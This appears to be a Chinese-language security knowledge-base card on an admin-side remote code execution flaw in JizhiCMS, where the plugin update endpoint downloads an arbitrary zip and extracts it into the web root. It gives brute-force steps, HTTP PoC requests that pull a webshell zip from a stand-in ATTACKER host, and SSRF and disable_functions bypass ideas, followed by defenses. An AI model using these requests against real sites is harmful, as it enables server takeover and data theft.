---
id: web-php-rce-jizhicms-plugin-update-download-unzip-webshell
title: 极致CMS 后台插件更新任意下载+解压：download_url 拉取 zip 到 cache/update，解压后 A/exts/ 落地 PHP webshell
type: scenario
domain: web
path: web/php/rce
technique: jizhicms-plugin-update-download-unzip
tags:
- php
- cms
- jizhicms
- file-download
- zip-slip
- webshell
- rce
- backend
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-07T23:36:31+08:00'
  notes: 已对照原文与49张图：start-download 响应的 tmp_path 为 cache/update/dbrestore.zip、/A/exts/a.php 显示 phpinfo；原文未贴解压请求，卡内 confidence=medium 合理。核对图06 实际 get-file-size 返回 size=144，已将卡内误写的 149 修正为 144。后台弱口令+验证码复用为入口条件，非本漏洞机制。未在目标实测。
url: /docs/web/php/rce/web-php-rce-jizhicms-plugin-update-download-unzip-webshell/
draft: false
kb_aliases:
- 极致CMS 插件更新 getshell
- start-download download_url
- dbrestore.zip 解压
- 极致CMS 0day
- /admin.php/Plugins/update.html
---

## 一句话结论

极致CMS 后台的 `/admin.php/Plugins/update.html` 插件更新接口把 `download_url` 交给服务端下载，攻击者让服务器把恶意 zip 拉取到 `cache/update/dbrestore.zip`，再调用同一接口的解压动作，把 zip 内的 `A/exts/a.php` 释放到 Web 根目录，访问 `/A/exts/a.php` 即得 PHP webshell；前置是后台弱口令（本场景 `admin/admin123`，且验证码可复用便于爆破）。

## 原理

- **入口**：`/admin.php/Plugins/update.html` 是插件/数据库恢复的更新接口，请求体 `action=start-download&filepath=dbrestore&download_url=<url>` 会让服务端用 `download_url` 下载文件到 `cache/update/<filepath>.zip`（响应返回 `tmp_path`）。
- **任意 URL 下载**：`download_url` 未做白名单/协议限制，服务器可被诱导请求攻击者 HTTP 服务，把恶意 zip 拉到自身磁盘；`action=get-file-size` 可回显下载后文件大小，用于确认下载成功。
- **任意解压/落盘**：随后调用同一接口的解压动作处理 `dbrestore.zip`。解压逻辑未过滤 zip 内路径，压缩包中构造 `A/exts/a.php`（或其它 Web 可访问路径）即可把 PHP 文件释放到站点根目录；本场景 zip 加了密码 `1`（按原文），解压后访问 `/A/exts/a.php` 得到 phpinfo。
- **利用前提**：该接口在后台，需管理员会话；本场景通过验证码复用 + 弱口令爆破得到 `admin/admin123`，再进后台调用接口。
- **后续限制**：webshell 进程受 `disable_functions` 限制（`dir` 等命令返回 127），需再用 AntSword 插件（LD_PRELOAD/FastCGI/PHP7_GC_UAF 等）绕过，或改用 PHP 函数完成信息收集。

## 触发条件

- 目标为极致CMS，暴露 `/admin.php` 后台与 `/admin.php/Plugins/update.html` 插件更新接口。
- 攻击者拥有后台会话（弱口令、验证码复用、会话劫持等）；本场景 `admin/admin123`。
- 目标能出网访问攻击者 HTTP 服务（或能访问内网可控 HTTP）。
- 解压逻辑未过滤 zip entry 路径，且解压目标位于 Web 根目录（或可通过相对路径穿越到 Web 根）。
- 原文未标注极致CMS 具体版本/受影响区间；不同版本 action 名称/参数可能不同。

## 利用步骤

1. 访问 `/admin.php`，测试后台登录；若验证码可复用，可固定验证码对账号口令做 Burp Intruder 爆破（本场景命中 `admin/admin123`）。
2. 本地把 `a.php`（phpinfo 或一句话）按 `A/exts/a.php` 的目录结构压缩为 `1.zip`，原文设置压缩密码 `1`。
3. 在攻击机起 HTTP 服务（如 `python3 -m http.server 8000`），确保目标可访问。
4. 登录后台，抓取 `Plugins/update.html` 请求，改为：
   `action=start-download&filepath=dbrestore&download_url=http://ATTACKER:8000/1.zip`
   响应返回 `tmp_path`（如 `.../cache/update/dbrestore.zip`）。
5. 发送 `action=get-file-size&filepath=dbrestore&download_url=...` 确认 `size` 非 0（本场景 144）。
6. 调用同一接口的解压 action 解压 `dbrestore.zip`（原文未贴完整解压请求，只说明"发包请求解压"）。
7. 访问 `http://target/A/exts/a.php` 验证 PHP 执行，使用蚁剑等连接；若命令执行被 disable_functions 拦截，再走 AntSword 的 disable_functions 绕过插件。

## PoC

```http
POST /admin.php/Plugins/update.html HTTP/1.1
Host: target:81
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<admin session>

action=start-download&filepath=dbrestore&download_url=http://ATTACKER:8000/1.zip
```

```http
POST /admin.php/Plugins/update.html HTTP/1.1
Host: target:81
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=<admin session>

action=get-file-size&filepath=dbrestore&download_url=http://ATTACKER:8000/1.zip
# 响应 {"code":0,"size":144}
```

zip 结构：

```text
1.zip
└── A/
    └── exts/
        └── a.php   # <?php phpinfo(); ?>
```

解压后访问 `http://target/A/exts/a.php`。

## 变体与关联

- `filepath` 可能可控解压目标/文件名，可尝试路径穿越把文件写到其它目录。
- `download_url` 可指向内网地址做 SSRF（下载内网文件到服务器），或指向攻击者 zip 做代码执行。
- zip 密码/解压参数按目标版本调整；若解压接口校验 `download_url` 与已下载文件，可先 `start-download` 再解压。
- 关联：其它 PHP CMS 后台插件/模板更新任意下载+解压 getshell、zip-slip 类漏洞；后台弱口令与验证码复用属入口条件。

## 检测与防御

- 后台更新接口的 `download_url` 做协议/域名白名单，禁止内网与外网任意地址；下载文件类型/大小/哈希校验。
- 解压前校验每个 entry 规范化后的路径必须位于预期目录，拒绝 `../`、绝对路径与符号链接。
- 后台强制强口令、验证码一次性使用并绑定会话；限制 `/admin.php` 访问来源与频率。
- 监控 `cache/update` 下异常 zip、Web 根目录新增 PHP 文件、对 `Plugins/update.html` 的可疑 POST。
